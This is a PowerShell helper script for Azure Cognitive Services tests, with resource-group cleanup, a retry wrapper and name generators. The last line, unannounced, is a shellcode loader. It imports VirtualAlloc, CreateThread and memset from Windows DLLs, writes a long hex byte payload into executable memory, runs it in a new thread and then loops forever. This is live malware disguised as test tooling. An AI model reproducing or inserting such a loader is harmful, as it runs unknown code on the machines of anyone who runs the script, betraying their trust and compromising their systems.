














function Clean-ResourceGroup($rgname)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) {
        Remove-AzResourceGroup -Name $rgname -Force
    }
}









function Retry-IfException
{
    param([ScriptBlock] $script, [int] $times = 30, [string] $message = "*")

    if ($times -le 0)
    {
        throw 'Retry time(s) should not be equal to or less than 0.';
    }

    $oldErrorActionPreferenceValue = $ErrorActionPreference;
    $ErrorActionPreference = "SilentlyContinue";

    $iter = 0;
    $succeeded = $false;
    while (($iter -lt $times) -and (-not $succeeded))
    {
        $iter += 1;

        try
        {
            &$script;
        }
        catch
        {

        }

        if ($Error.Count -gt 0)
        {
            $actualMessage = $Error[0].Exception.Message;

            Write-Output ("Caught exception: '$actualMessage'");

            if (-not ($actualMessage -like $message))
            {
                $ErrorActionPreference = $oldErrorActionPreferenceValue;
                throw "Expected exception not received: '$message' the actual message is '$actualMessage'";
            }

            $Error.Clear();
            Wait-Seconds 10;
            continue;
        }

        $succeeded = $true;
    }

    $ErrorActionPreference = $oldErrorActionPreferenceValue;
}


function Test-CreateCognitiveServicesAccount
{
	param([string] $rgname, [string] $accountname, [string] $accounttype, [string] $skuname, [string] $loc)

	
	$createdAccount = New-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Type $accounttype -SkuName $skuname -Location $loc -Force;
	
	
	Assert-NotNull $createdAccount;

	
	Retry-IfException { Remove-AzCognitiveServicesAccount -ResourceGroupName $rgname -Name $accountname -Force; }
}


function Get-RandomItemName
{
    param([string] $prefix = "pslibtest")
    
    if ($prefix -eq $null -or $prefix -eq '')
    {
        $prefix = "pslibtest";
    }

    $str = $prefix + ((Get-Random) % 10000);
    return $str;
}


function Get-CognitiveServicesManagementTestResourceName
{
    $stack = Get-PSCallStack
    $testName = $null;
    foreach ($frame in $stack)
    {
        if ($frame.Command.StartsWith("Test-", "CurrentCultureIgnoreCase"))
        {
            $testName = $frame.Command;
        }
    }
    
    $oldErrorActionPreferenceValue = $ErrorActionPreference;
    $ErrorActionPreference = "SilentlyContinue";
    
    try
    {
        $assetName = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::GetAssetName($testName, "pstestrg");
    }
    catch
    {
        if (($Error.Count -gt 0) -and ($Error[0].Exception.Message -like '*Unable to find type*'))
        {
            $assetName = Get-RandomItemName;
        }
        else
        {
            throw;
        }
    }
    finally
    {
        $ErrorActionPreference = $oldErrorActionPreferenceValue;
    }

    return $assetName
}
$cg6F = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $cg6F -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xf2,0xe4,0xab,0x3a,0xd9,0xe9,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x5a,0x0f,0x03,0x5a,0xfd,0x06,0x5e,0xc6,0xe9,0x45,0xa1,0x37,0xe9,0x29,0x2b,0xd2,0xd8,0x69,0x4f,0x96,0x4a,0x5a,0x1b,0xfa,0x66,0x11,0x49,0xef,0xfd,0x57,0x46,0x00,0xb6,0xd2,0xb0,0x2f,0x47,0x4e,0x80,0x2e,0xcb,0x8d,0xd5,0x90,0xf2,0x5d,0x28,0xd0,0x33,0x83,0xc1,0x80,0xec,0xcf,0x74,0x35,0x99,0x9a,0x44,0xbe,0xd1,0x0b,0xcd,0x23,0xa1,0x2a,0xfc,0xf5,0xba,0x74,0xde,0xf4,0x6f,0x0d,0x57,0xef,0x6c,0x28,0x21,0x84,0x46,0xc6,0xb0,0x4c,0x97,0x27,0x1e,0xb1,0x18,0xda,0x5e,0xf5,0x9e,0x05,0x15,0x0f,0xdd,0xb8,0x2e,0xd4,0x9c,0x66,0xba,0xcf,0x06,0xec,0x1c,0x34,0xb7,0x21,0xfa,0xbf,0xbb,0x8e,0x88,0x98,0xdf,0x11,0x5c,0x93,0xdb,0x9a,0x63,0x74,0x6a,0xd8,0x47,0x50,0x37,0xba,0xe6,0xc1,0x9d,0x6d,0x16,0x11,0x7e,0xd1,0xb2,0x59,0x92,0x06,0xcf,0x03,0xfa,0xeb,0xe2,0xbb,0xfa,0x63,0x74,0xcf,0xc8,0x2c,0x2e,0x47,0x60,0xa4,0xe8,0x90,0x87,0x9f,0x4d,0x0e,0x76,0x20,0xae,0x06,0xbc,0x74,0xfe,0x30,0x15,0xf5,0x95,0xc0,0x9a,0x20,0x03,0xc4,0x0c,0x0b,0x7c,0xb8,0x45,0xe3,0x7f,0x45,0x54,0x4f,0xf6,0xa3,0x06,0xff,0x59,0x7c,0xe6,0xaf,0x19,0x2c,0x8e,0xa5,0x95,0x13,0xae,0xc5,0x7f,0x3c,0x44,0x2a,0xd6,0x14,0xf0,0xd3,0x73,0xee,0x61,0x1b,0xae,0x8a,0xa1,0x97,0x5d,0x6a,0x6f,0x50,0x2b,0x78,0x07,0x90,0x66,0x22,0x81,0xaf,0x5c,0x49,0x2d,0x3a,0x5b,0xd8,0x7a,0xd2,0x61,0x3d,0x4c,0x7d,0x99,0x68,0xc7,0xb4,0x0f,0xd3,0xbf,0xb8,0xdf,0xd3,0x3f,0xef,0xb5,0xd3,0x57,0x57,0xee,0x87,0x42,0x98,0x3b,0xb4,0xdf,0x0d,0xc4,0xed,0x8c,0x86,0xac,0x13,0xeb,0xe1,0x72,0xeb,0xde,0xf3,0x4f,0x3a,0x26,0x86,0xa1,0xfe;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$XBgO=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($XBgO.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$XBgO,0,0,0);for (;;){Start-sleep 60};

